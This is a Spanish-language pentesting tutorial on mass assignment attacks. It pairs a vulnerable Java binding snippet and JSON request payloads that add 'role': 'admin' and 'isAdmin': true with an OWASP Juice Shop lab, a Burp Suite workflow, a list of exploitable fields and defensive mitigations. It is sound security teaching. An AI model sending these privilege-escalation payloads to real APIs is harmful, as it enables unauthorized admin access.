## 📚 **Índice**

- [[#🎯 1 Qué es un Mass Assignment Attack]]
- [[#🧠 2 Por qué ocurre esta vulnerabilidad]]
- [[#🧱 3 Diferencia entre lo que ve el usuario y lo que procesa el backend]]
- [[#💣 4 Vector de ataque real paso a paso]]
- [[#🧪 5 Laboratorio vulnerable Juice Shop (Docker)]]
- [[#🛠️ 6 Explotación práctica con Burp Suite]]
- [[#🔍 7 Campos típicos explotables en Mass Assignment]]
- [[#🧠 8 Cómo identificar Mass Assignment durante un pentest]]
- [[#🛡️ 9 Mitigaciones (visión defensiva)]]

---

## 🎯 **1. Qué es un Mass Assignment Attack**

Un **Mass Assignment Attack** ocurre cuando una aplicación web **asigna automáticamente parámetros de una petición HTTP a un objeto del backend**, sin filtrar correctamente qué campos puede modificar el usuario.

El atacante **no crea nuevas funcionalidades**, sino que:

👉 **envía más parámetros de los que el formulario expone**  
👉 **manipula campos que el backend sí procesa pero la UI no muestra**

Resultado:  
🔴 Escalada de privilegios  
🔴 Modificación de datos sensibles  
🔴 Bypass de lógica de negocio

---

## 🧠 **2. Por qué ocurre esta vulnerabilidad**

Suele darse cuando el backend usa frameworks que hacen **binding automático**, por ejemplo:

- Java (Spring / Jackson)
    
- Node.js (Express + body parsers)
    
- Ruby on Rails
    
- Laravel
    
- Django REST Framework
    

Ejemplo conceptual en backend:

```java
User user = new User();
user = requestBody; // asignación masiva
```

⚠️ El servidor **confía ciegamente** en lo que llega en el body.

---

## 🧱 **3. Diferencia entre UI y backend (concepto clave)**

### Lo que el usuario VE en el formulario:

```json
{
  "email": "user@test.com",
  "password": "123456"
}
```

### Lo que el backend ACEPTA realmente:

```json
{
  "email": "user@test.com",
  "password": "123456",
  "role": "user",
  "isAdmin": false,
  "verified": false
}
```

👉 **El formulario no muestra `role`, pero el backend sí lo maneja.**

Ahí vive el bug.

---

## 💣 **4. Vector de ataque real (paso a paso)**

### Escenario típico

Formulario de registro de usuario.

### 1️⃣ Registras un usuario normal

Interceptas la petición con **Burp**:

```http
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "email": "attacker@test.com",
  "password": "123456"
}
```

### 2️⃣ Observas la respuesta del servidor:

```json
{
  "id": 15,
  "email": "attacker@test.com",
  "role": "customer"
}
```

💡 **Clave**: el backend asigna `role` automáticamente.

---

### 3️⃣ Manipulas la petición manualmente (Mass Assignment)

Envías esto:

```json
{
  "email": "attacker@test.com",
  "password": "123456",
  "role": "admin"
}
```

### 4️⃣ Resultado posible:

- Usuario creado como admin
    
- Acceso a panel administrativo
    
- Escalada de privilegios completa
    

🔥 **Mass Assignment explotado**.

---

## 🧪 **5. Laboratorio vulnerable — Juice Shop (Docker)**

Repositorio oficial:

➡ [https://hub.docker.com/r/bkimminich/juice-shop](https://hub.docker.com/r/bkimminich/juice-shop)

Levantar el laboratorio:

```bash
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Acceder:

```
http://localhost:3000
```

Juice Shop es **el laboratorio perfecto** para Mass Assignment porque:

- Usa APIs REST
    
- Tiene roles (`customer`, `admin`)
    
- Expone campos internos en respuestas
    
- Es intencionalmente vulnerable (OWASP Top 10)
    

---

## 🛠️ **6. Explotación práctica con Burp Suite**

### Flujo real:

1. Burp → Proxy → Intercept ON
    
2. Registrar usuario en Juice Shop
    
3. Interceptar el `POST /api/Users`
    
4. Observar la respuesta del backend
    
5. Detectar campos como:
    
    - `role`
        
    - `isAdmin`
        
    - `deluxe`
        
6. Reenviar la petición agregando campos extra
    

Ejemplo explotable:

```json
{
  "email": "evil@test.com",
  "password": "123456",
  "role": "admin",
  "isAdmin": true
}
```

Si el backend no valida → **control total**.

---

## 🔍 **7. Campos típicos explotables en Mass Assignment**

Busca siempre parámetros como:

- `role`
    
- `isAdmin`
    
- `admin`
    
- `permissions`
    
- `verified`
    
- `active`
    
- `premium`
    
- `balance`
    
- `discount`
    
- `credit`
    
- `status`
    

👉 Si aparecen en la **respuesta**, pruébalos en la **request**.

---

## 🧠 **8. Cómo identificar Mass Assignment en un pentest**

Checklist mental:

- 🔍 ¿La API devuelve más campos de los que envío?
    
- 🔍 ¿Hay campos “internos” en la respuesta?
    
- 🔍 ¿La UI no muestra todos los campos?
    
- 🔍 ¿Puedo reenviar la request con parámetros extra?
    
- 🔍 ¿El backend acepta JSON libremente?
    

Herramientas clave:

- Burp Proxy
    
- Burp Repeater
    
- Comparer (diferencias de respuesta)
    

---

## 🛡️ **9. Mitigaciones (visión defensiva)**

Desde el lado defensivo, se evita con:

- ✔️ **Whitelist de campos permitidos**
    
- ✔️ DTOs (Data Transfer Objects)
    
- ✔️ Validaciones explícitas en backend
    
- ✔️ Ignorar parámetros inesperados
    
- ✔️ No confiar en input del cliente
    
- ✔️ No devolver campos sensibles en respuestas
    

Ejemplo seguro:

```java
User user = new User();
user.setEmail(body.email);
user.setPassword(body.password);
```

---

## 🎯 **Conclusión PRO**

El **Mass Assignment Attack** no rompe criptografía,  
no necesita exploits complejos,  
no usa payloads raros.

Solo requiere:

👉 observar  
👉 pensar como backend  
👉 manipular peticiones

Por eso es **tan peligroso y tan común**.

En APIs modernas, **es oro puro para un pentester**.

---
